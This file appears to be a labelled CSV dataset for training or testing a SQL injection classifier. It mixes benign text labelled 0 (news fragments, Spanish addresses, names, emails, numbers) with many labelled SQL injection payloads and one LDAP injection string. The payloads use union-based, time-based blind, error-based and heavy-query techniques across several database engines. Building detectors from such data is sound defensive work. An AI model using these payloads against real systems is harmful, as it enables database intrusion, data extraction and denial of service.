Sentence,Label
" An overview milk egg alternatives Vegan nutrition promotes vegetable alternatives eggs , milk dairy products ",0
1 )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
emesh,0
5 million ,0
"manuel monterrey calvo, 186,",0
galdano,0
" By 5-4 vote , justices ruled Patient Protection Affordable Care Act &apos;s individual mandate - requires citizens buy health insurance 2014 else pay penalty - constitutional taxing power government ",0
sant juli de ramis,0
3407,0
"-4589"" )  union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",1
N,0
92,0
"1""  )  )  ",1
09824561l,0
darby,0
"1'  )  )   as crzr where 5373 = 5373 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
7u6can*i2a04n,0
 US Airways briefly tried charging beverages 2008 backed seven months later passengers complained major airline followed ,0
pepe.whitehead@jaxiaabogadosyeconomistas.nr,0
wessell.georg@smalltec.md,0
ayca mols,0
"c/ doctor temes fernandez, 35",0
 ( case when 6398 = 6398 then 1 else null end ) ,1
a8ique0r4r,0
506ca,0
1'  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'mfmk' = 'mfmk,1
arganza,0
"1"" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and ""twmy"" = ""twmy",1
"1' )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 'zpzf' = 'zpzf",1
-7565' )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 'gymz' = 'gymz,1
marling,0
18772944e,0
16140,0
argimn,0
frasquit,0
"calle plantio, 178,",0
40560,0
"-2394' )  union all select 1650,1650,1650,1650,1650,1650,1650--",1
korbel,0
" , contend valid safety reason prohibitions ",0
 A southern Georgia judge Wednesday ordered authorities release surveillance video investigators reviewed ,0
"carrero boix, 112, 3?d",0
""" )  or pg_sleep ( __TIME__ ) --",1
9357275036779206,0
leyden,0
narvarte delgado,0
ponts,0
"-8734%"" )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( ""%"" = """,1
 It empowers children make decision ,0
"calle llorente, 73,",0
"calle santa pola, 7",0
"1"" or elt ( 6272 = 6272,sleep ( 5  )  )   and ""zzca"" = ""zzca",1
"-9487  )  )   as rvck where 9404 = 9404 or make_set ( 8921 = 6045,6045 ) --",1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'atvu' = 'atvu",1
hightower@freetag.cl,0
hervs,0
33300,0
-2300 )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ,1
select,1
 To round morning tombola ,0
1' where 1770 = 1770,1
crosby,0
berrisfo,0
maestre camprubi,0
"-4543"" )  or 3038 = 3038",1
" Eventually, two segmentations formed according punctuation prediction results, shown Figure 1(c)",0
pr86o8ci8nad0,0
5 metres accommodate oncoming traffic ,0
select sleep ( 5 )  and   (  (   ( 'qjsc' = 'qjsc,1
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ",1
26520,0
calle juan valera 97 12d,0
4087914907992137,0
"1%"" and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""%"" = """,1
zapach,0
"1'|| ( select 'wtdz' from dual where 1866 = 1866 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
marven,0
falset,0
1' in boolean mode )  and  ( 3020 = 3020 ) *6703#,1
albuquerque periquet,0
"c/ jara 9,",0
mathieso,0
1'|| ( select 'lmsc' from dual where 1162 = 1162 order by 1--,1
lefebre_heribelle@shamballa-es.by,0
"1'+ ( select 'qaar' where 7841 = 7841 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  )  +'",1
c/ virgen del rocio 57 6?f,0
 This sculpture memory without preestablished harmony,0
kishida@fruteriacartaya.gm,0
chuvalo@ppmanzanares.nc,0
2812,0
carrer vidal i barraquer 28,0
" Anger Bali bomb plotter &apos;s sentence Survivors relatives 202 people killed 2002 Bali bombing reacted anger sentence given last plotters face justice , saying Umar Patek face firing squad ",0
1 where 8393 = 8393,1
ceajo,0
3348558480673240,0
"1 )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1
barranco de fraga 132 11c,0
ellston balladares,0
1059928902417697,0
schreier,0
narrillos del lamo,0
"1'  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
durovic,0
e00tr6o,0
1'  )  )   as bewk where 3672 = 3672 or sleep ( 5 ) --,1
fedora,0
-7209'  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'stqx' = 'stqx,1
gallocanta,0
" select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1",1
4s3as4ra,0
sidonio,0
"1""  )  )   as xcyo where 2929 = 2929",1
"angel custodio 44, 12-c",0
mordazmente,0
masferr massans,0
16802646l,0
egle,0
select  ( case when  ( 9318 = 7198 )  then 9318 else 9318* ( select 9318 from information_schema.character_sets )  end ) #,1
select  ( case when  ( 5198 = 2518 )  then 5198 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
furnari pentinat,0
"1""  )  )   as wooq where 7671 = 7671 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1
"1%"" )  and 8715 = 5529",1
if ( 4735 = 8907 )  select 4735 else drop function qigo--,1
 Thy love afar spite home,0
400ol4,0
1 where 6827 = 6827,1
"1"" order by 1--",1
cubia cajahuanca,0
"1%""  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  ""%"" = """,1
guaita zaragoza,0
ip50,0
"c/ clarin, 117",0
"1""  )  )   as hwlh where 1071 = 1071 union all select null,null,null,null,null,null,null,null#",1
promanar,0
"-5417 or elt ( 1032 = 1032,3623 ) ",1
9600,0
brandsen,0
6374,0
68689912k,0
badosa estruch,0
 The concept universal hit ,0
revestimiento,0
excepta,0
pols,0
9728,0
30482828p,0
"1"" )  union all select null,null,null--",1
3141141898028856,0
05298,0
hopgood9@cartasdeajuste.td,0
1  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
1'|| ( select 'adoe' from dual where 7662 = 7662,1
"1"" )  as nraw where 7984 = 7984 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
-3859 )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 5846 = 5846,1
lazo,0
16417,0
1'|| ( select 'dsjg' where 2402 = 2402 and 1947 = 7472--,1
-1354  )  )   or 8571 = 8571--,1
1 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ,1
"1 )  as agex where 8167 = 8167 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --",1
-6144' )  or 9385 = 2474--,1
1agostn,0
yeste meloda,0
leeson,0
 There treatments delay early menses ward another consequence: premature aging bones ultimately lead stunted growth short adult ,0
boada,0
limpias,0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",1
" According Times &apos; national political correspondent Jonathan Martin , book provides thorough account effort senior officials inside campaign White House , namely former White House Chief Staff Bill Daley , measure effect swapping former Secretary State Clinton Vice President would polls ",0
donath@tgcprint.eg,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  7749 = 7749",1
"corredoira dos cornos, 175 4-c",0
straths@campanasextractoras.vn,0
 We grateful every single one absolutely tremendous ,0
piejo,0
928,0
sanzana,0
foto3rfico,0
9875693785507781,0
1'+ ( select 'ymgm' where 8204 = 8204 and sleep ( 5 ) #,1
1'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
maurizio,0
crampton4,0
crislida,0
2865,0
"1 )  where 7748 = 7748 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1 )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
 Circuit Court Appeals said decisions Judge Shira Scheindlin stayed pending outcome appeal city ,0
"1"" rlike  ( select  ( case when  ( 5552 = 1712 )  then 1 else 0x28 end  )  )  ",1
" Mainz already without injured key players Niki Zimling , Julian Baumgartlinger Niko Bungert ",0
"-1434'  )  )   union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",1
torreblacos,0
b66762o,0
annimamente,0
cobradora,0
emp34h82o,0
"cerro, el",0
siefert,0
8032,0
"1 )  where 8302 = 8302 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1
degeistirk@meneamex.pr,0
"1'|| ( select 'zdfo' from dual where 4288 = 4288 union all select null,null,null,null,null,null,null--",1
04560,0
navalperal de tormes,0
ch35isca,0
select case when 3920 = 4402 then 1 else null end--,1
"1'|| ( select 'jrbp' from dual where 4129 = 4129 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
"-7101  )  )   )  union all select 4587,4587,4587,4587,4587,4587--",1
37607,0
montclar,0
olmeda de las fuentes,0
5494259806699868,0
1' or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and 'ejdk' like 'ejdk,1
"1'  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'cenk' = 'cenk",1
"c/ padre ignacio ellaguria, 117 6-e",0
c63en13759,0
krzyski-wieman@hiperzaragoza.er,0
17864,0
"1""  )  )   as qhnb where 8302 = 8302 and  ( 3020 = 3020 ) *6703--",1
enumer24,0
dacio,0
octagonal,0
" Four proposals still competing second L-mission place: large X-ray telescope called &quot; Athena &quot; , among things would research black holes , &quot; Icy Planets &quot; , another mission outer planets solar system , &quot; prism &quot; , mission measurement cosmic background radiation , &quot; Exoplanet Finder &quot; , would find investigate planets similar Earth ",0
yax,0
fustukian@comercioenlacalle.tf,0
morfea,0
"calle teresa pamies i bertran 21,",0
"1' )  union all select null,null,null#",1
"1'  )  )   ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (  'rnyb' = 'rnyb",1
09110,0
1745,0
mbrose,0
hubach larrumbe,0
"-6453""  )  )   as hehs where 9363 = 9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",1
bleifer@muchacha.com.bh,0
" While formal requirement devote timetable maths , Coalition sources said extensive maths GCSE - combined weighting subject league tables - likely encourage schools provide extra teaching ",0
 The lessees also wanted longer terms ,0
"select * from generate_series ( 2382,2382,case when  ( 2382 = 4352 )  then 1 else 0 end )  limit 1--",1
goodman4,0
' select * from information_schema.tables--,1
select  ( case when  ( 6839 = 2730 )  then 6839 else 6839* ( select 6839 from mysql.db )  end ) #,1
"1"" union all select null,null,null,null#",1
-8143 )  union all select 3014--,1
sternikova@clo2.mg,0
12965,0
"1"" where 7371 = 7371 waitfor delay '0:0:5'--",1
1o510426,0
" As crowds horse-showing experts gathered Cardiff battle Horse Year , knew competition would tough ",0
"iif ( 9342 = 6508,1,1/0 ) ",1
5093,0
5936907680257741,0
 select * from users where id = 1   or 1 = 1 -- 1,1
"xiprer 61, 2-a",0
 select * from users where id = 1 <@1$ or 1 = 1 -- 1,1
' or 2 between 1 and 3,1
oliva,0
 Sentence boundary detection punctuation prediction extensively studied speech processing field attracted research interest natural language processing field well,0
enseriarse,0
1i6p06ej7,0
" Fighting back tears , said Patek sentenced death ",0
"labiano, s/n 7?a",0
conceptualismo,0
1' )  as hqaq where 6411 = 6411 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
deyecta,0
67094993z,0
-6540' )  where 5019 = 5019 or  ( 8459 = 8459 ) *4906--,1
 Mayoral candidate Roman Waizenegger also found among visitors joint breakfast ,0
savitsky@tetdevelocidad.sj,0
8474675220591045,0
amaranta,0
"1""  )  )   as fjtv where 8904 = 8904",1
kunneke@storagecraft.nz,0
 select * from users where id = 1 <@.$ or 1 = 1 -- 1,1
5827164850982375,0
"1 and elt ( 4249 = 4249,7259 ) ",1
" Globally , patterns early puberty appear influenced everything economic conditions climate genes ",0
%2A%28%7C%28objectclass%3D%2A%29%29,1
"1""  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  ""prhp"" = ""prhp",1
"-7939"" )  or 3958 = 6909",1
1' where 9242 = 9242,1
select  ( case when  ( 8916 = 1357 )  then 8916 else 8916* ( select 8916 from information_schema.character_sets )  end ) #,1
tardguila,0
ixta sole,0
3309243329438501,0
" Among issues addressed dual nationality , regard sides opposing ideas ",0
"1%"" )  union all select null,null,null,null--",1
" The awards participation performances choir rehearsals means presentation &quot; activity posies &quot; , year went Choir Director Dieter Schulze , 44 attendance marks , followed Honorary Chairman Horst Pier-Ribbert , Chairman , last year &apos;s &quot; Singer Year &quot; Friedrich Winkler , attended 42 times ",0
golpeadura,0
"-2860""  )  )   order by 1#",1
t!74ador,0
carrillo-whitson@mobilecrm.fj,0
9127471588357421,0
teodora,0
"c/ narcisa freixas, 61 13?h",0
epps6,0
"1 )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( 5098 = 5098",1
01449036j,0
"-6125'|| ( select 'hwnm' where 1428 = 1428 union all select 1428,1428,1428,1428,1428,1428#",1
"-4772  )  )   )  union all select 3879,3879,3879,3879,3879--",1
srinivas,0
bonany lambarri,0
cecile,0
corello6@eurograb.id,0
sot143a82,0
almonacid de la cuba,0
5592414895500154,0
gravoso,0
espndola pavajeau,0
31494,0
tie3t54,0
warrello2,0
 Only post boxes front post office building Ernst-Ludwig-Straße 36 Jakob-Müller-Straße 1 Hüttenfeld still emptied ,0
thuswald,0
"-1084 where 1181 = 1181 or make_set ( 9354 = 9354,7185 ) --",1
ferrs gortrez,0
calb fermoselle,0
"1%' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
illa,0
han-chie,0
" On predominantly empty stage - one important requirement: crumpled sofa , cast members allude copulating masturbating - eight-person ensemble work way text material ",0
 Patek last Bali bombers face justice ,0
fragmentar,0
"-7482""  )  )   )  or 9077 = 2651",1
95531349k,0
"calle alhondiga, 103, 12d",0
 The Civil Aviation Safety Authority also said looking announcement emphasised restrictions use electronic devices critical phases flight still place Australia ,0
"1%"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
9528500439395561,0
macoosh3,0
"1""  )  )   )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
-5350  )  )   or 9323 = 9323#,1
"1"" )  as drrx where 8633 = 8633 union all select null,null,null--",1
94046799y,0
5907,0
maeya,0
galatea,0
4797639945557963,0
el taxista 199 10?c,0
16670,0
61z,0
1056,0
" I wish expiate, live",0
" select * from users where id = 1 <1## union select 1,version (  )  -- 1",1
7676907583941560,0
causa,0
47239,0
de4737ur6a,0
15820845l,0
"c/ universidad laboral 193,",0
"1%' )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( '%' = '",1
stevenin@ceramicasmio.mn,0
otvar,0
"1'|| ( select 'gboi' where 4191 = 4191 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  )  ||'",1
-2316'  )  )   )  or 8519 = 6010,1
"1"" )  as qirf where 6200 = 6200  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
46415307l,0
41022572w,0
1' where 9602 = 9602,1
" On trucks , front seats may defect reclining mechanism ",0
maynez giovannetti,0
45190,0
1 )  rlike  ( select  ( case when  ( 5477 = 7492 )  then 1 else 0x28 end  )  )   and  ( 4427 = 4427,1
cortes de la frontera,0
"1%"" )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1%"" and make_set ( 2905 = 5725,5725 )  and ""%"" = """,1
don juan 126,0
select  ( case when  ( 2056 = 1917 )  then 2056 else 1/ ( select 0 )  end ) --,1
elia6,0
8330458587602542,0
llaguno,0
gou,0
beal,0
1'  )  )   )  waitfor delay '0:0:5' and   (  (   ( 'wvzb' = 'wvzb,1
"calle hospital, 68",0
ezequas,0
smethurst-salvador@mcrspain.vn,0
miera,0
scavran@eonon.com.at,0
"roure, 43, 3?d",0
des7768ab9e6os,0
"-6883"" )  as tbai where 8121 = 8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",1
" The dispute focuses width seats provided long-haul flights economy passengers - always ones courted airlines , whose allocated space holds key efficiency claims latest jets offered Airbus SAS Boeing Co ",0
colobran rebull,0
"1%"" and 1343 = 5939#",1
 &quot; The firefighters brilliant ,0
torre-cardela,0
"1%' )  union all select null,null,null#",1
simon@sms24h.pg,0
aguilera troule,0
62847702h,0
 Beautiful animals delicious tarts entice The beautiful rabbits various breeds colourings presented District Exhibition weekend community centre ,0
"1%' or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
lippe-bubat4@tradora.va,0
"1"" and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""eslo"" like ""eslo",1
"-6305""  )  )   )  or 8097 = 2048 and   (  (   ( ""euyy"" like ""euyy",1
macdougall_laurier@rocofer.am,0
25514,0
"c/ alfonso de armas ayala s/n,",0
xaviera,0
pirotto nin,0
26256,0
8601557814301462,0
"-9959"" )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""vcwc"" = ""vcwc",1
"1  )  )   and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
floriana,0
benedict@deltamarina.ve,0
1'  )  )   as tley where 3539 = 3539,1
"calle de can castellvi 35, 10-h",0
-2223'  )  )   as mjwp where 8650 = 8650 or 7900 = 5838,1
godden,0
parton@necesitocurro.mt,0
vilaller,0
 In wanted point danger even bigger ruins Schweizer Wiese - huge project one day fail ,0
"1"" )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( ""rzja"" like ""rzja",1
"prat de llobregat, el",0
steele,0
71,0
zidanelia,0
corera,0
" But agreeing take official oath court , rather parliament customary , bowing military &apos;s indication contest power continue ",0
sheila,0
marlow@botilleria.com.ec,0
8e3i2ar,0
mino@showcarsmadrid.com.zm,0
"-2962'  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 'hkjo' = 'hkjo",1
mar mendivil,0
"1' )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( 'jhxh' = 'jhxh",1
diver-domergue7@elsentidodelavida.cc,0
"1'+ ( select 'yfrs' where 4388 = 4388 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
espinoza blancarte,0
-6473' union all select 7537#,1
ace673,0
33372246m,0
"1', ( select  ( case when  ( 2073 = 5314 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
calvin@espaciodelpintor.by,0
"1'  )  )   as uncy where 8009 = 8009 union all select null,null,null,null,null,null,null,null,null#",1
4105436805418109,0
2144,0
99ortadero,0
6336,0
pennie,0
ben-isha,0
 The announcement Organization Prohibition Chemical Weapons came one day ahead Nov ,0
6asi3ar2o,0
" Furthermore: Since undergoing meniscus operation , lady , mid-fifties , experience means move floor floor disability ",0
alm.ora,0
4518310510128542,0
"1%""  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
-2781  )  )   )  or 2573 = 5848--,1
homs amazarray,0
-6036  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 6723 = 6723,1
32783648t,0
-8301'  )  )   )  or  ( 5708 = 5268 ) *5268 and   (  (   ( 'hkha' = 'hkha,1
glandgera,0
"-8999"" where 2821 = 2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",1
erill crespo,0
kaoud,0
"1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""ncym"" like ""ncym",1
4870628613160341,0
" There participants tour told story construction church gain insight development Protestant congregation , Catholic area ",0
melero benaducci,0
1693717556836495,0
9845728819454113,0
"hi or 1 = 1 --""",1
pedro de la gasca 140,0
"1%' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and '%' = '",1
45840,0
1  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 3332 = 3332,1
42462633x,0
3636105969407891,0
